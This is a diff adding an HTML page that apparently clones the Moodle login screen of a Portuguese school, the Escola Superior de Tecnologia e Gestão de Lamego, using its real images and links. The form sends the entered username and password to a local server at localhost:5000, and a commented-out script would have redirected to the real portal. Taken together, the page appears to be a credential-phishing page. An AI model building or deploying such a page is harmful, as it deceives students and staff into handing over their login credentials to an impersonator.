@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta http-equiv="expires" content="-1" />
+    <title>Moodle - Escola Superior de Tecnologia e Gestão de Lamego: Entrar no site</title>
+    <link rel="stylesheet" media="(max-width: 800px)" href="altura-max800.css" />
+    <link rel="shortcut icon" href="https://elearning2324.estgl.ipv.pt/theme/image.php?theme=lambda&amp;component=theme&amp;rev=1712567184&amp;image=favicon">
+    <style>
+        body {
+            font-family: Open, sans-serif;
+            background-image: url("https://elearning2324.estgl.ipv.pt/theme/image.php?theme=lambda&amp;component=theme&amp;rev=1712567184&amp;image=page_bg%2Fpage_bg_00");
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-size: cover;
+            background-position: center;
+        }
+
+        .container {
+            font-family: Open Sans, sans-serif;
+            background: white;
+            padding: 20px;
+            border-radius: 1px;
+            max-width: 700px;
+            text-align: center;
+            margin-top: 40px;
+            margin-left: 1px;
+            opacity: 0.9;
+            border: 8px solid rgba(222,226,228,0.35);
+        }
+
+        h1 {
+            font-family: Open Sans, sans-serif;
+            font-size: 31.98px;
+            margin: 10px 0px 21px;
+            color: #555555;
+            text-align: left;
+        }
+
+        h2 {
+            font-family: Open Sans, sans-serif;
+            font-size: 27.95px;
+            margin: 10px 0px 21px;
+            color: #555555;
+            text-align: center;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            background-color: #EEEEEE;
+        }
+
+        label {
+            text-align: left;
+            margin-left: 10px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            padding: 10px;
+            border: 0px solid;
+            border-radius: 1px;
+            width: 100%;
+            box-sizing: border-box;
+            font-family: Open Sans, sans-serif;
+            margin-bottom: -30px;
+            width: 650px;
+            margin-left: 25px;
+            margin-top: 30px;
+            font-size: 14px;
+        }
+
+        input:focus-visible {
+            outline: none;
+            border: 1px solid #c5dcee;
+            box-shadow: 0 1px 30px 0 #c5dcee;
+        }
+
+        button[type="submit"] {
+            background-color: #e10707;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 2px;
+            cursor: pointer;
+            width: 650px;
+            margin-left: 25px;
+            margin-top: 60px;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #bc2c00;
+        }
+
+        .recover-password {
+            font-family: Open Sans, sans-serif;
+            margin-top: -18px;
+            color: #bc2c00;
+            text-decoration: none;
+            font-size: 13px;
+            margin-right: 549px;
+            margin-bottom: 50px;
+        }
+
+
+        .visitor-access {
+            font-family: Open Sans, sans-serif;
+            font: 27.95px;
+            margin: 10px 0px;
+            color: #555555;
+        }
+
+        .visitor-button {
+            background-color: #77ae29;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            margin: 0px 0px 0px 5px;
+            padding: 6px 18px;
+            font: 14.04px;
+            font-size: 15.04px;
+        }
+
+        .visitor-button:hover {
+            background-color: #4aaa00;
+        }
+
+        footer select {
+            padding: 5px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .cookies-button {
+            background-color: #77ae29;
+            color: rgb(255, 255, 255);
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            margin: 0px 0px 0px 5px;
+            padding: 6px 18px;
+            font: 14.04px;
+            font-size: 14.04px;
+            text-decoration: none;
+            margin-left: 6px;
+        }
+
+        .cookies-button:hover {
+            background-color: #4aaa00;
+        }
+
+        .slector-button {
+            background-color: #77ae29;
+            color: rgb(255, 255, 255);
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            margin: 0px 0px 0px 5px;
+            padding: 6px 18px;
+            font: 14.04px;
+            font-size: 14.04px;
+            text-decoration: none;
+            margin-right: 30px;
+            width: 210px;
+        }
+
+        .img {
+            margin-left: 1px;
+            margin-bottom: 1px;
+            margin-top: -140px;
+            padding-top: -100px;
+        }
+
+        
+    </style>
+    <script>
+        function redirectToPage(event) {
+            event.preventDefault(); 
+            window.location.href = "https://portal.ipv.pt/estgl/page";
+        }
+    </script>
+</head>
+<body>
+    <div class="img">
+        <a href="https://elearning2324.estgl.ipv.pt/">
+            <img src="logo_novo.png" alt="" width="620px" height="90px">
+        </a>
+    </div>
+    <div class="container">
+        <main>
+            <h1>Entrar em Moodle - Escola Superior de Tecnologia e Gestão de Lamego</h1>
+            <form action="http://localhost:5000/new_login" method="post">
+                <input type="text" id="username" name="username" placeholder="Nome de utilizador" required>
+                
+                <input type="password" id="password" name="password" placeholder="Senha" required>
+                
+                <!-- <button type="submit" onclick="redirectToPage(event)">Entrar</button> -->
+                <button type="submit">Entrar</button>
+                
+                <a href="https://adsync.ipv.pt/sync/forgotpass.php" class="recover-password">Recuperar senha</a>
+            </form>
+            <div class="visitor-access">
+                <h2>Algumas disciplinas podem aceitar visitantes</h2>
+                <a href="https://elearning2324.estgl.ipv.pt/">
+                    <button class="visitor-button">Aceder como visitante</button>
+                </a>
+            </div>
+            <footer>
+                <select class="slector-button">
+                    <option>Português - Portugal (pt)</option>
+                    <option>Espanõl - Internacional (es)</option>
+                    <option>Français (fr)</option>
+                    <option>Inglish (en)</option>
+                </select>
+                <a href="https://www.pingodoce.pt/receitas/bolachas-cookies-cream/" class="cookies-button">Informação sobre cookies</a>
+                </a>
+            </footer>
+        </main>
+    </div>
+</body>
+</html>
